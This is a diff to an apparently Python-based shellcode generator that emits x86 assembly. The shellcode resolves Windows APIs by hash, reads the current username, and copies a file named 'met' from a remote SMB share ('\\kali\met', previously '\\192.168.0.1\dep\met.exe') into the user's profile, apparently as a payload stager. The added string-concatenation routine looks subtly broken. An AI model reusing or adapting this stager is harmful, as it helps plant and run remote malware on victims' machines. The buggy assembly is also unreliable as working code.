@@ -11,8 +11,8 @@ from coder.util import (
 def generate(bad_chars, exit_func, debug=False):
     hash_key = find_hash_key(
         [
-            ("SHELL32.DLL", "SHGetFolderPathA"),
-            ("KERNEL32.DLL", "CopyFileA"),
+            ("ADVAPI32.DLL", "GetUserNameA"),
+            ("KERNEL32.DLL", "CopyFileExA"),
             ("KERNEL32.DLL", "CreateProcessA"),
         ]
         + ([exit_func] if exit_func else []),
@@ -27,28 +27,51 @@ def generate(bad_chars, exit_func, debug=False):
 
     {find_and_call.generate(hash_key)}
 
-    get_desktop_path:                   // SHFOLDERAPI SHGetFolderPathA([in] HWND hwnd, [in] int csidl, [in] HANDLE hToken, [in] DWORD dwFlags, [out] LPSTR pszPath);
+    get_username:                       // BOOL GetUserNameA([out] LPSTR   lpBuffer, [in, out] LPDWORD pcbBuffer);
+        xor eax, eax                    // Zeroify eax
+        mov eax, 0x200                  // Initialization of pcbBuffer
+        push eax                        // pcbBuffer (arg2)
+        xor eax, eax                    // Zeroify eax
         sub esp, 0x200                  // BufferAllocation to contain Desktop path
-        lea eax, [esp]                  // put @buffer in eax
-        push eax                        // Argument5: pszPath
-        mov edi, eax                    // On sauvegarde le pointeur vers notre buffer dans EDI
-        xor eax, eax                    // eax <- 0
-        push eax                        // Argument4: dwFlags
-        push eax                        // Argument3: hToken
-        mov eax, 0x10                   // 
-        push eax                        // Argument2: csidl
-        xor  eax, eax                   // eax <- 0
-        push eax                        // Argument1: hwnd
-        {push_hash('SHELL32.DLL', 'SHGetFolderPathA', hash_key)}
-        call dword ptr [ebp+0x04]       // Call SHGetFolderPathA
-        
-    copy_to_desktop:                    // BOOL CopyFileA([in] LPCSTR lpExistingFileName, [in] LPCSTR lpNewFileName, [in] BOOL bFailIfExists);
-        xor eax, eax                    //
-        push eax                        // Argument3: bFailIfExists
-        push edi                        // Argument2: Destination
-        {push_string("\\\\192.168.0.1\\dep\\met.exe", bad_chars)}   // Argument1: lpExistingFileName
-        {push_hash('KERNEL32.DLL', 'CopyFileA', hash_key)}
-        call dword ptr [ebp+0x04]       // Call CopyFileA
+        lea eax, [esp]                  // put @lpBuffer in eax
+        mov esi, eax                    // We save @lpBuffer for later uses
+        push eax                        // lpBuffer (arg1)
+        {push_hash('ADVAPI32.DLL', 'GetUserNameA', hash_key)}
+        call dword ptr [ebp+0x04]       // Call GetUserNameA
+    
+    construct_destination_path:         // Construct "C:\\Users\\<Username>\\met"
+        mov edi, esi                    // Copy username buffer to EDI
+        sub esp, 0x200                  // Allocate space for full path
+        lea eax, [esp]                  // Address of final buffer
+        mov esi, eax                    // Save final buffer address in ESI
+        push esi                        // Push final buffer address for later use
+        {push_string("C:\\Users\\", bad_chars)} // Base path
+        call concat_paths               // Concatenate base path and username
+
+        {push_string("\\met", bad_chars)} // Append sub-path and filename
+        call concat_paths               // Concatenate sub-path to full path
+
+    copy_file:                          // BOOL CopyFileExA([in] LPCSTR lpExistingFileName, [in] LPCSTR lpNewFileName, [in, optional] LPPROGRESS_ROUTINE lpProgressRoutine, [in, optional] LPVOID lpData, [in, optional] LPBOOL pbCancel, [in] DWORD dwCopyFlags);
+        xor eax, eax                    // Zeroify eax
+        push eax                        // dwCopyFlags (arg6)
+        push eax                        // pbCancel (arg5)
+        push eax                        // lpData (arg4)
+        push eax                        // lpProgressRoutine (arg3)
+        push esi                        // lpNewFileName (arg2) - DestinationPath
+        {push_string("\\\\kali\\met", bad_chars)} // lpExistingFileName (arg1) - Source file path
+        {push_hash('KERNEL32.DLL', 'CopyFileExA', hash_key)}
+        call dword ptr [ebp+0x04]       // Call CopyFileExA
+
 
     {call_exit_func.generate(exit_func, hash_key)}
+    
+    
+    concat_paths:                       // Concatenate two paths
+        mov ecx, 0x200                  // Max length for concatenation
+    copy_loop:
+        lodsb                           // Load byte from source (ESI) into AL
+        stosb                           // Store byte in destination (EDI)
+        test al, al                     // Check for null terminator
+        jnz copy_loop                   // Repeat if not null
+        ret                             // Return to caller
     """
